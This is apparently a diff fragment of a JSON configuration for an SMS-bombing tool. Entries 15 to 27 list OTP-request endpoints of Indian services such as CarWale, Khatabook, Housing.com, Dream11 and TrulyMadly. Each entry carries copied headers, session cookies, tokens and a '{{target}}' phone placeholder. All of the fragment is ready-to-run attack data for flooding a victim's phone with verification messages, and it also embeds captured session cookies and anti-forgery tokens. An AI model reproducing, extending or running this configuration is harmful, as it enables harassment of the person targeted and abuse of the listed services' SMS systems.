+                              "api-key":"c41121ed-b6fb-c9a6-bc9b-574c82929e7e",
+                              "content-type": "application/json",
+                              "origin": "https://onboarding.nuvamawealth.com",
+                              "referer": "https://onboarding.nuvamawealth.com/",
+                              "user-agent":"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+                        },
+                        "payload":{
+                           "contactInfo": "{{target}}",
+                           "mode": "SMS"
+                        }
+                      },
+                       {
+                        "sno":"15",
+                        "name":"car wale ",
+                        "url":"https://www.carwale.com/api/user/login/otp-request/",
+                        "method":"POST",
+                        "headers":{ 
+                               "accept": "*/*",
+                                "accept-encoding": "gzip, deflate, br, zstd",
+                                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+                                "content-type": "application/json;charset=UTF-8",
+                                "origin": "https://www.carwale.com",
+                                "referer": "https://www.carwale.com/maruti-suzuki-cars/",
+                                "requestverificationtoken": "CfDJ8JUh_GoNOjhBqUJ2d7OuCzRMbdq7TmVRAShRirHJLiWnUoeX80I0AmJdr2klylVW0RIC4cb9KZHkofRlTNlA06WagsJCwLvvHKkP9V4pZwVNcR85_-suuHYTVW4q6Re_vaz2GT3x08Prvj0Wx6LnMT0",  
+                                "serverdomain": "CarWale",
+                                "user-agent":"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                                "cookie":"CWC=ZNTT5bn1IXHV65XU1b5UC1m8G; _cwutmz=utmcsr%3Dgoogle%7Cutmgclid%3D%7Cutmccn%3D%28organic%29%7Cutmcmd%3Dorganic%7Cutmtrm%3D%7Cutmcnt%3D; CurrentLanguage=en; _pageviews_modelid=-1; _abtest=70; languageSelected=en; .AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8JUh_GoNOjhBqUJ2d7OuCzTpGIoOI5ue74clxIJx7XmcY06MCKK4RmETOGgVb5Bq9Llq5kJz_7owehelmGYOCZ-522FLFfZh1JDtSmAIsCOHMiPa8Z9nh4y_nFt5xyl0PAaIT6TU4E_SG97Rew6NHRY; _gcl_au=1.1.306381875.1756826274; _ga=GA1.1.1479122502.1756826275; theme=light; vernacularPopupClose=1; BHC=ZNTT5bn1IXHV65XU1b5UC1m8G; bhs_cw=ZNTT5bn1IXHV65XU1b5UC1m8G.UUTLoHQVjn.1756826244.1756826244.1756826244.1; _fbp=fb.1.1756826281224.905098421486978132; cebs=1; _ce.clock_data=958%2C152.56.141.110%2C1%2C8f694609bddc4903b8e8fee50d783cc1%2CChrome%2CIN; FCNEC=%5B%5B%22AKsRol-NaDP1z5Cg2m0f6OSTeaNQnfOV8j3Ff-JBsN_Yq6lXkWME4iN7JiXRGuL35oxuwZIdumOwpJVO-6hZ1KL_uL81YYGdx234yX_KPqdY3HdQ90ZXeCKJAvimhMDGh6FpHWEuppyclbLIN3rRPyEu2PmeqsN1MA%3D%3D%22%5D%5D; cebsp_=1; _ce.s=v~d1b05c86feebc589c51a7260a5d15a1d265353d9~lcw~1756826283705~vir~new~lva~1756826281878~vpv~0~as~false~v11.cs~44156~v11.s~05385ec0-8810-11f0-9ff6-57399ee40aad~v11.vs~d1b05c86feebc589c51a7260a5d15a1d265353d9~v11.fsvd~eyJ1cmwiOiJjYXJ3YWxlLmNvbS9tYXJ1dGktc3V6dWtpLWNhcnMiLCJyZWYiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInV0bSI6W119~v11.sla~1756826283698~v11.ss~1756826283705~v11ls~05385ec0-8810-11f0-9ff6-57399ee40aad~lcw~1756826283708; __gads=ID=5378749089711a6a:T=1756826281:RT=1756826281:S=ALNI_MaIIc6xFKmR_y8uRMO93GP1BqHV0w; __gpi=UID=0000118cdc8d9433:T=1756826281:RT=1756826281:S=ALNI_MYNl3NoSX39kakbF4REU_IGx6mOVA; __eoi=ID=5f118729d6a93494:T=1756826281:RT=1756826281:S=AA-AfjYNvKaPAMm7MxLSeLAL2Ymt; _uetsid=05ae31d0881011f09fe0854fd4141e71; _uetvid=05ae7480881011f0b877ef6f01647eaf; _cwv=ZNTT5bn1IXHV65XU1b5UC1m8G.UUTLoHQVjn.1756826244.1756826244.1756826284.1; _cwutmzsrc=G%7CG; _cwutmzmed=O%7CO; _ga_Z81QVQY510=GS2.1.s1756826274$o1$g1$t1756826299$j35$l0$h0"
+                       },
+                              
+                        "payload":{
+                           "mobileNo": "{{target}}",
+                           "sourceModule": 14
+                        }
+                      },
+                       {
+                        "sno":"16",
+                        "name":"deal share",
+                        "url":"https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
+                        "method":"POST",
+                        "headers":{ 
+                               "content-type": "application/json",
+                              "deviceid": "b1d97fa46c3a5512",
+                              "devicetype": "tablet",
+                              "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+                       },
+                        "payload":{
+                             "phoneNumber": "{{target}}",
+                             "name": "{{target}}",
+                            "hashCode": "",
+                            "resendOtp": 0,
+                            "source": "web",
+                            "deviceId": "b1d97fa46c3a5512",
+                            "loginType": "OTP"
+                        }
+                      },
+                      {
+                        "sno": "17",
+                        "name": "khatabook",
+                        "url": "https://api.khatabook.com/v1/auth/request-otp",
+                        "method": "POST",
+                        "headers": {
+                          "accept": "application/json, text/plain, */*",
+                          "accept-encoding": "gzip, deflate, br, zstd",
+                          "accept-language": "en",
+                          "content-type": "application/json",
+                          "origin": "https://khatabook.com",
+                          "referer": "https://khatabook.com/",
+                          "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                          "x-kb-app-locale": "en",
+                          "x-kb-app-name": "Khatabook Website",
+                          "x-kb-app-version": "000100",
+                          "x-kb-new-auth": "false",
+                          "x-kb-platform": "web"
+                        },
+                        "payload": {
+                          "country_code": "+91",
+                          "phone": "{{target}}",
+                          "app_signature": "Jc/Zu7qNqQ2"
+                        }
+                      },
+                      {
+                        "sno": "18",
+                        "name": "housing",
+                        "url": "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=desktop&source=web&source_name=AudienceWeb",
+                        "method": "POST",
+                        "headers": {
+                          "accept": "application/json, text/plain, */*",
+                          "content-type": "application/json; charset=UTF-8",
+                          "origin": "https://housing.com",
+                          "referer": "https://housing.com/",
+                          "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                          "cookie": "ssrExperiments=newrelic_browser%3Dold80%3B..." 
+                        },
+                        "payload": {
+                          "query": "mutation($phone: String, $preference: String, $userAgent: String) { sendOtp(phone: $phone, preference: $preference, userAgent: $userAgent) { success message } }",
+                          "variables": {
+                            "phone": "{{target}}",
+                            "preference": "sms",
+                            "userAgent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+                          }
+                        }
+                        },
+                        {
+                          "sno": "19",
+                          "name": "Bewakoof ",
+                          "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
+                          "method": "POST",
+                          "headers": { 
+                            "content-type": "application/json",
+                            "cookie": "trkId=c4252240-9df8-49be-9650-72a29cbf8b8c; abId=20; _clck=14sbwd5%5E2%5Efz0%5E0%5E2072; polaris_session=68b7b58ea4deff2c89d9c30a; _gcl_aw=GCL.1756870033.CjwKCAjwq9rFBhAIEiwAGVAZP9rrqf5Vf4nINTYJvXpImtgdnoKk0WAf-0qIIYqkipOkWfNsFvlBqhoCujEQAvD_BwE; _gcl_gs=2.1.k1$i1756870030$u217154181; _gcl_au=1.1.1492344221.1756870033; _ga=GA1.1.1725453400.1756870033; _scid=FqnlucOtWSROTDLYA83ZeQS-oTrdeO1S; _scid_r=FqnlucOtWSROTDLYA83ZeQS-oTrdeO1S; WZRK_S_8R9-845-Z84Z=%7B%22p%22%3A1%7D; _fbp=fb.1.1756870034103.672277371449764914; _ScCbts=%5B%5D; _clsk=l0hz7m%5E1756870034429%5E2%5E1%5Eq.clarity.ms%2Fcollect; _ga_F5TF0XY73D=GS2.1.s1756870033$o1$g1$t1756870063$j30$l0$h0",
+                            "host": "api-prod.bewakoof.com",
+                            "origin": "https://www.bewakoof.com",
+                            "preferred-location": "IN",
+                            "referer": "https://www.bewakoof.com/",
+                            "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                            "x-ab-id": "20",
+                            "x-client-device-token": "MWY5ZTNmNzFmN2M1ZTUyMjkwNjM2NGMzNmNjZTA3N2Q6M2RhMmI3OTgtNTY2MC00ZDRhLWJhZWQtNTZlMDI2MWRlYmZm",
+                            "x-origin-host": "api-prod.bewakoof.com/v3/user/auth/login/otp",
+                            "x-tmrw-request-trace-id": "8dca73b3-1881-4e9f-a6e8-1cac22d37bb0",
+                            "x-tmrw-trace-id": "c4252240-9df8-49be-9650-72a29cbf8b8c"
+                          },
+                          "payload": {
+                            "mobile": "{{target}}",
+                            "country_code": "+91"
+                          }
+                        },
+                        {
+                          "sno": "20",
+                          "name": "TrulyMadly",
+                          "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
+                          "method": "POST",
+                          "headers": {
+                            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                            "origin": "https://trulymadly.com",
+                            "referer": "https://trulymadly.com/",
+                            "source": "web_pwa",
+                            "system-language": "en",
+                            "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+                          },
+                          "payload": {
+                            "country_code": "91",
+                            "mobile": "{{target}}"
+                          }
+                        },
+                        {
+                          "sno": "21",
+                          "name": "UpGrad ",
+                          "url": "https://prod-auth-api.upgrad.com/apis/auth/v6/registration/initiate",
+                          "method": "POST",
+                          "headers": {
+                            "content-type": "application/json",
+                            "origin": "https://www.upgrad.com",
+                            "referer": "https://www.google.com/",
+                            "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+                          },
+                          "payload": {
+                            "phoneNumber": "+91{{target}}",
+                            "otpVerificationMode": "phone",
+                            "config": {},
+                            "otpTarget": "phone"
+                          }
+                        },
+                        {
+                          "sno": "22",
+                          "name": "Dehaat",
+                          "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
+                          "method": "POST",
+                          "headers": {
+                            "content-type": "application/json",
+                            "origin": "https://dehaat.in",
+                            "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+                          },
+                          "payload": {
+                            "mobile_number": "{{target}}",
+                            "client_id": "kisan-app"
+                          }
+                        },
+                      {
+                            "sno": "23",
+                            "name": "HyugaLife",
+                            "url": "https://hyuga-auth-service.pratech.live/v2/auth/otp-generate",
+                            "method": "POST",
+                            "headers": {
+                              "content-type": "application/json",
+                              "origin": "https://hyugalife.com",
+                              "referer": "https://hyugalife.com/",
+                              "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+                            },
+                            "payload": {
+                              "mobile_number": "{{target}}",
+                              "token": "eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTc3MzExNzIxMzEsIm1vYmlsZV9udW1iZXIiOiI2MzA3OTYyMzAwIn0.pSVWVBEekQZAB6tRAEPwlI9a5-OFBhl23Smt7DH6_6Y"
+                            }
+                          },
+
+                          {
+                                "sno": "24",
+                                "name": "NoBroker",
+                                "url": "https://www.nobroker.in/api/v3/account/otp/send",
+                                "method": "POST",
+                                "headers": {
+                                  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                                  "sentry-trace": "206f82656ceb4f8ca5991b1aed4afb8e-bf10ad9303d878dc",
+                                  "User-Agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+                                },
+                                "payload": {
+                                  "phone": "{{target}}",
+                                  "countryCode": "IN"
+                                }
+                              },
+                              {
+                                "sno": "25",
+                                "name": "Dream11",
+                                "url": "https://www.dream11.com/auth/passwordless/init",
+                                "method": "POST",
+                                "headers": {
+                                  "content-type": "application/json",
+                                  "cookie": "_scid=wsFOcnKZHkHMzb1fKhNAM_vWCvBMNyMe; _scid_r=wsFOcnKZHkHMzb1fKhNAM_vWCvBMNyMe; _sctr=1%7C1747161000000; _ga_KVTC9Y339K=GS2.1.s1756874056$o1$g0$t1756874056$j60$l0$h0; _ga=GA1.1.1978555210.1756874056; dh_user_id=402cd730-887f-11f0-9d96-ab2be115acb1; __csrf=z9wArG; _dd_s=rum=2&id=f05e6c10-ae87-48a6-85f0-a4d634a3d53e&created=1756874060091&expire=1756875026308",
+                                  "device": "pwa",
+                                  "origin": "https://www.dream11.com",
+                                  "referer": "https://www.dream11.com/login",
+                                  "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                                  "x-device-identifier": "macos"
+                                },
+                                "payload": {
+                                  "channel": "sms",
+                                  "flow": "SIGNIN",
+                                  "phoneNumber": "{{target}}",
+                                  "templateName": "default"
+                                }
+                              },
+                              {
+                                "sno": "26",
+                                "name": "KPNFresh",
+                                "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
+                                "method": "POST",
+                                "headers": {
+                                  "content-type": "application/json",
+                                  "origin": "https://www.kpnfresh.com",
+                                  "referer": "https://www.kpnfresh.com/",
+                                  "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                                  "x-app-id": "8be6a54a-4abf-4fe0-af33-1fe2b132f966",
+                                  "x-channel-id": "WEB",
+                                  "x-user-journey-id": "f6fce1b7-ecd2-47b0-bd13-c7c8fede62f5"
+                                },
+                                "payload": {
+                                  "phone_number": {
+                                    "number": "{{target}}",
+                                    "country_code": "+91"
+                                  }
+                                }
+                              },
+                              {
+                                "sno": "27",
+                                "name": "EazyDiner",
+                                "url": "https://force.eazydiner.com/web/otp",
+                                "method": "POST",
+                                "headers": {
+                                  "content-type": "application/json",
+                                  "medium": "web",
+                                  "origin": "https://www.eazydiner.com",
+                                  "referer": "https://www.eazydiner.com/",
+                                  "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+                                },
+                                "payload": {
+                                  "mobile": "+91{{target}}"
+                                }
+                              }
+
+
+
+
+
+
+
+
+
+
+                   
+
+
+                     
+                
+
+
+
+
+
+                      ]
